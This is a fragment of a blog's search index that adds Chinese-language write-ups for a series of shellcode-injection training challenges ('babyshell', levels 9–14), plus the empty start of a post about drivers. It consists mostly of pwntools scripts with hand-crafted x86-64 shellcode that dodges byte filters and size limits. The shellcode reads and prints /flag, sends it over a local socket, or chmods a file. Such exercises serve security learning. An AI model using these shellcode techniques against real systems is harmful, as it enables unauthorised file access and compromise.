+    elif ((shellcode_len // 10) % 2 == 0 and shellcode_pad_flag == 0):
+        shellcode_tmp += shellcode_list[i] + '\n'
+        shellcode_len += len(asm(shellcode_list[i]))
+        i += 1
+        
+    elif ((shellcode_len // 10) % 2 == 1):
+        shellcode_len -= len(asm(shellcode_list[i - 1]))
+        tmp = shellcode_tmp.splitlines()
+        tmp = tmp[:-1]
+        shellcode_tmp = '\n'.join(tmp)
+        shellcode_tmp += '\n'
+        i -= 1
+        shellcode_pad_flag = 1
+        
+    
+print(shellcode_tmp)
+```
+
+生成的exp
+
+```python
+from pwn import *
+from string import *
+from random import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''    mov rdi, 2
+    jmp EIBi
+    .rept 11
+    nop
+    .endr
+EIBi:
+    mov rax, 3
+    jmp wIoJ
+    .rept 11
+    nop
+    .endr
+wIoJ:
+    syscall
+    xor rsi, rsi
+    xor rdx, rdx
+    jmp GGxU
+    .rept 10
+    nop
+    .endr
+GGxU:
+    sub rsp, 5
+    mov byte ptr [rsp], 0x2f
+    jmp HIQh
+    .rept 10
+    nop
+    .endr
+HIQh:
+    mov byte ptr [rsp+1], 0x66
+    jmp hAbJ
+    .rept 13
+    nop
+    .endr
+hAbJ:
+    mov byte ptr [rsp+2], 0x6c
+    jmp bxUa
+    .rept 13
+    nop
+    .endr
+bxUa:
+    mov byte ptr [rsp+3], 0x61
+    jmp JNPB
+    .rept 13
+    nop
+    .endr
+JNPB:
+    mov byte ptr [rsp+4], 0x67
+    jmp GoxX
+    .rept 13
+    nop
+    .endr
+GoxX:
+    mov byte ptr [rsp+5], 0x01
+    jmp xzHp
+    .rept 13
+    nop
+    .endr
+xzHp:
+    sub byte ptr [rsp+5], 0x01
+    push rsp
+    pop rdi
+    jmp UTod
+    .rept 11
+    nop
+    .endr
+UTod:
+    mov al, 2
+    syscall
+    mov rdi, rax
+    jmp Imgn
+    .rept 11
+    nop
+    .endr
+Imgn:
+    mov rsi, rsp
+    jmp EDoc
+    .rept 15
+    nop
+    .endr
+EDoc:
+    mov rdx, 0x50
+    jmp qLZG
+    .rept 11
+    nop
+    .endr
+qLZG:
+    xor rax, rax
+    syscall
+    mov rdx, rax
+    jmp AbtY
+    .rept 10
+    nop
+    .endr
+AbtY:
+    mov dil, 1
+    mov rsi, rsp
+    mov al, 1
+    jmp UuTH
+    .rept 10
+    nop
+    .endr
+UuTH:
+    syscall
+    mov rax, 0x3c
+    syscall'''
+
+hex_shellcode = asm(shellcode)
+print(hex_shellcode)
+p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
+# p = process('./level9_chall_cp')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
+# p.send(hex_shellcode + b'\n')
+p.interactive()
+
+```
+
+
+
+### level 10
+
+要求从小到大，可以开始查一些单字节双字节指令插进去（这题用的多的是nop）
+
+```python
+from pwn import *
+from string import *
+from random import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+//  open
+    mov rbx, 0x67616c662f
+    nop
+    xor rsi, rsi
+    xor rdx, rdx
+    mov al, 2
+    push rbx
+    push rsp
+    nop
+    nop
+    pop rdi
+    syscall
+    nop
+
+// read
+    mov rdi, rax
+    mov rsi, rsp
+    nop
+    nop
+    nop
+    nop
+    mov dl, 0x50
+    nop
+    xor rax, rax
+
+    syscall
+    
+// write
+    nop
+    nop
+    nop
+    mov dil, 1
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rsi, rsp
+    mov rdx, rax
+    mov al, 1
+    syscall
+    nop
+    nop
+    inc rax
+'''
+
+hex_shellcode = asm(shellcode)
+print(hex_shellcode)
+# p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
+p = process('./level10_chall')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
+# p.send(hex_shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 11
+
+用的socket，和上题一样但是长很多所以调整更多
+
+```python
+from pwn import *
+from string import *
+from random import *
+# context.syntax = 'intel'
+context(os='linux',arch='amd64',log_level='debug',terminal=['tmux','splitw','-h'])
+flag_file = '/flag'
+flag_file = flag_file[::-1]
+flag_file = flag_file.encode().hex()
+# print(flag_file)
+
+shellcode = f'''
+// socket:
+    xor rdi, rdi
+    xor rsi, rsi
+    xor rax, rax
+    mov dil, 2
+    mov sil, 1
+    xor rdx, rdx
+    mov al, 41
+    syscall
+
+    nop
+    mov rdi, rax
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov r9, rax
+    
+//  socket addr preparation
+    nop
+    sub rsp, 4
+    mov word ptr [rsp + 0], 2
+    nop
+    nop
+    mov word ptr [rsp + 2], 0x2e16
+    nop
+    nop
+    mov word ptr [rsp + 4], 0x007f
+    xchg eax, ecx
+    mov word ptr [rsp + 6], 0x0100
+    xchg eax, ecx
+
+    push rsp
+    pop rsi
+
+//  connect
+    mov dl, 16
+    mov al, 42
+    xchg eax, ecx
+    xchg ecx, eax
+    syscall
+
+    mov rcx, rdi
+    nop
+    xchg eax, ecx
+    xchg ecx, eax
+
+// open:
+    xor rsi, rsi
+    xor rdx, rdx
+    xchg eax, ecx
+    xchg eax, ecx
+    sub rsp, 5
+    xchg eax, ecx
+    xchg eax, ecx
+    xchg eax, edx
+    xchg eax, edx
+    mov byte ptr [rsp], 0x2f
+    xchg eax, edx
+    xchg eax, edx
+    xchg eax, edx
+    xchg eax, edx
+    mov byte ptr [rsp+1], 0x66
+    nop
+    xchg eax, ebx
+    xchg eax, ebx
+    mov byte ptr [rsp+2], 0x6c
+    nop
+    xchg eax, ebx
+    xchg eax, ebx
+    mov byte ptr [rsp+3], 0x61
+    nop
+    xchg eax, ebp
+    xchg eax, ebp
+    mov byte ptr [rsp+4], 0x67
+    nop
+    xchg eax, ebp
+    xchg eax, ebp
+    mov byte ptr [rsp+5], 0x00
+    nop
+    xchg eax, esi
+    xchg eax, esi
+    push rsp
+    pop rdi
+    mov al, 2
+    syscall
+    xchg eax, edi
+    xchg eax, edi
+
+// read:
+    mov rdi, rax
+    mov rsi, rsp
+    xchg eax, edi
+    xchg eax, edi
+    mov dl, 0x50
+    nop
+    nop
+    xor rax, rax
+    xchg eax, edi
+    xchg eax, edi
+    syscall
+
+
+// write:
+    mov rdx, rax
+    test eax, eax
+    xor rdi, rdi
+    mov rdi, r9
+    test eax, eax
+    mov rsi, rsp
+    mov al, 0
+    inc rax
+    syscall
+
+    mov rdi, rax
+    inc rax
+    mov al, 3
+    
+    syscall
+    nop
+    inc rax
+'''
+
+hex_shellcode = asm(shellcode)
+# p = gdb.debug('./level9_chall_cp','b *main\nb *main + 912')
+p = process('./level10_chall')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',hex_shellcode + b'\n')
+# p.send(hex_shellcode + b'\n')
+p.interactive()
+```
+
+
+
+### level 12
+
+不能重复，这里就用chmod那个打法
+
+```python
+from pwn import *
+context(os='linux',arch='amd64')
+shellcode = '''
+    mov al, 0x5a
+    mov sil, 7
+    push 0x66     
+    // f
+    push rsp
+    pop rdi
+    syscall
+'''
+p = process('/challenge/babyshell_level13')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',asm(shellcode))
+p.interactive()
+```
+
+
+
+### level 13
+
+前面的exp可以打通，这里不是很理解为什么没有write还可以push和pop
+
+```python
+from pwn import *
+context(os='linux',arch='amd64')
+shellcode = '''
+    mov al, 0x5a
+    mov sil, 7
+    push 0x66     
+    // f
+    push rsp
+    pop rdi
+    syscall
+'''
+p = process('/challenge/babyshell_level13')
+p.sendafter('Reading 0x1000 bytes from stdin.\n',asm(shellcode))
+p.interactive()
+# 即使栈没有写权限，还是可以push和pop
+```
+
+
+
+### level 14
+
+6字节，这里只能read，调试利用已有的寄存器，`fd = 1`即可接着写入shellcode
+
+```python
+from pwn import *
+context(os='linux',arch='amd64', terminal=['tmux','splitw','-h'],log_level='debug')
+shellcode = '''
+    xor edi, edi
+    mov esi, edx
+    syscall
+'''
+# p = process('/challenge/babyshell_level14')
+# p = gdb.debug('/challenge/babyshell_level14','b *main + 634')
+p = gdb.debug('./level14_chall','b* main + 674')
+p.sendafter('Reading 0x6 bytes from stdin.\n',asm(shellcode))
+shellcode = '''
+//  open
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    mov rbx, 0x0067616c662f
+    mov rsi, 0
+    mov rdx, 0
+    mov al, 2
+    push rbx
+    push rsp
+    pop rdi
+    syscall
+
+// read
+    mov rdi, rax
+    mov rsi, rsp
+    mov rdx, 0x50
+    mov rax, 0
+    syscall
+
+// write
+    mov rdi, 1
+    mov rsi, rsp
+    mov rdx, rax
+    mov rax, 1
+    syscall
+'''
+p.send(asm(shellcode))
+p.interactive()
+```
+
+
+
+-->]]></content>
+  </entry>
+  <entry>
+    <title>初探驱动</title>
+    <url>/2024/01/15/%E5%88%9D%E6%8E%A2%E9%A9%B1%E5%8A%A8/</url>
+    <content><![CDATA[<h6 id="PREFACE：偷点资料入个门吧，性质应该属于随便看看"><a href="#PREFACE：偷点资料入个门吧，性质应该属于随便看看" class="headerlink" title="PREFACE：偷点资料入个门吧，性质应该属于随便看看"></a>PREFACE：偷点资料入个门吧，性质应该属于随便看看</h6><span id="more"></span>
+]]></content>
   </entry>
 </search>
